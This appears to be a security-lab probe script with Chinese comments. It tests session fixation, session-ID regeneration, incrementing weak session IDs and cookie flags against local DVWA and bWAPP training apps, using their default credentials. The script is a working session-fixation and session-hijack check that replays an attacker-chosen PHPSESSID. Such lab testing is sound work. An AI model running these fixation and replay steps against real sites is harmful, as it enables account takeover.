#!/usr/bin/env python3
# loop3 t4 probe4: B4 会话固定 + weak_id 自增预测 + Cookie 属性（纯观察，零业务写入）
import re, json, time, datetime
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}
UA = "loop3-t4/1.0 (authorized local lab)"


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:700], flush=True)
    return kw


def tok(html):
    m = re.search(r"name='user_token' value='([^']+)'", html) or re.search(r'name="user_token" value="([^"]+)"', html)
    return m.group(1) if m else None


def setcook(r):
    return [v.split(";")[0] for v in r.raw.headers.getlist("Set-Cookie")] if hasattr(r.raw.headers, "getlist") else r.headers.get("Set-Cookie", "")


# ============ A. 服务器是否接受「攻击者自选」的会话 ID（use_strict_mode=Off） ============
FIXED = "loop3t4fixedsessionid000000000001"
s = requests.Session()
s.headers["User-Agent"] = UA
s.cookies.set("PHPSESSID", FIXED, domain="127.0.0.1", path="/")
r = s.get(BASE + "/dvwa/login.php", timeout=20)
t = tok(r.text)
rec("A1_get_login_with_attacker_chosen_id", status=r.status_code, token_len=len(t or ""),
    set_cookie=setcook(r), cookie_used=s.cookies.get("PHPSESSID"))
time.sleep(GAP)
r = s.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": t},
           allow_redirects=False, timeout=20)
rec("A2_post_login_same_id", status=r.status_code, loc=r.headers.get("Location"),
    set_cookie=setcook(r), cookie_after=s.cookies.get("PHPSESSID"))
time.sleep(GAP)

# 全新客户端，只带这个被预置的 ID，看是否已认证
fresh = requests.Session()
fresh.headers["User-Agent"] = UA
fresh.cookies.set("PHPSESSID", FIXED, domain="127.0.0.1", path="/")
r = fresh.get(BASE + "/dvwa/index.php", timeout=20)
rec("A3_replay_preseeded_id_fresh_client", status=r.status_code,
    logged_in=("Welcome :: Damn Vulnerable Web Application" in r.text),
    title=(re.search(r"<title>(.*?)</title>", r.text, re.S).group(1).strip() if re.search(r"<title>(.*?)</title>", r.text, re.S) else None))
time.sleep(GAP)

# 负对照：垃圾 ID
junk = requests.Session()
junk.headers["User-Agent"] = UA
junk.cookies.set("PHPSESSID", "garbage_loop3_not_a_session_zzz", domain="127.0.0.1", path="/")
r = junk.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
rec("A4_negative_control_garbage_id", status=r.status_code, loc=r.headers.get("Location"))
time.sleep(GAP)

# ============ B. 正常流程下登录前后 PHPSESSID 是否重新生成 ============
s2 = requests.Session()
s2.headers["User-Agent"] = UA
r = s2.get(BASE + "/dvwa/login.php", timeout=20)
pre = s2.cookies.get("PHPSESSID")
rec("B1_pre_auth_id", id=pre, set_cookie=setcook(r))
time.sleep(GAP)
r = s2.post(BASE + "/dvwa/login.php",
            data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok(r.text)},
            allow_redirects=False, timeout=20)
post = s2.cookies.get("PHPSESSID")
rec("B2_post_auth_id", id=post, regenerated=(pre != post), set_cookie=setcook(r))
time.sleep(GAP)
r = s2.get(BASE + "/dvwa/index.php", timeout=20)
rec("B3_index_with_new_id", status=r.status_code, logged_in=("Welcome :: Damn Vulnerable Web Application" in r.text))
time.sleep(GAP)
# 旧 ID 是否仍可用（会话未失效）
old = requests.Session()
old.headers["User-Agent"] = UA
old.cookies.set("PHPSESSID", pre, domain="127.0.0.1", path="/")
r = old.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
rec("B4_old_prelogin_id_after_login", status=r.status_code, loc=r.headers.get("Location"))

# ============ C. weak_id: dvwaSession 自增序列 ============
w = requests.Session()
w.headers["User-Agent"] = UA
r = w.get(BASE + "/dvwa/login.php", timeout=20)
time.sleep(GAP)
w.post(BASE + "/dvwa/login.php",
       data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok(r.text)},
       allow_redirects=False, timeout=20)
seq = []
for i in range(7):
    time.sleep(GAP)
    r = w.post(BASE + "/dvwa/vulnerabilities/weak_id/", data={}, timeout=20)
    vals = [v for v in r.raw.headers.getlist("Set-Cookie")] if hasattr(r.raw.headers, "getlist") else []
    dv = [v for v in vals if "dvwaSession" in v]
    seq.append(dv[0].split(";")[0] if dv else f"none(status={r.status_code})")
rec("C_weak_id_sequence", samples=seq, count=len(seq))

# ============ D. Cookie 属性（B3/B5 配置层根因） ============
attrs = {}
for path in ("/dvwa/login.php", "/dvwa/index.php", "/bWAPP/login.php", "/bWAPP/portal.php"):
    if path.startswith("/bWAPP"):
        bb = requests.Session()
        bb.headers["User-Agent"] = UA
        r = bb.post(BASE + path, data={"login": "bee", "password": "bug", "security_level": "0", "form": "submit"},
                    allow_redirects=False, timeout=20) if "login" in path else bb.get(BASE + path, allow_redirects=False, timeout=20)
    else:
        r = requests.get(BASE + path, timeout=20)
    raw = r.headers.get("Set-Cookie", "")
    attrs[path] = raw
    time.sleep(0.6)
rec("D_set_cookie_headers", **attrs)

with open("/tmp/loop3-t4-probe4.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "steps": len(OUT["steps"])}))
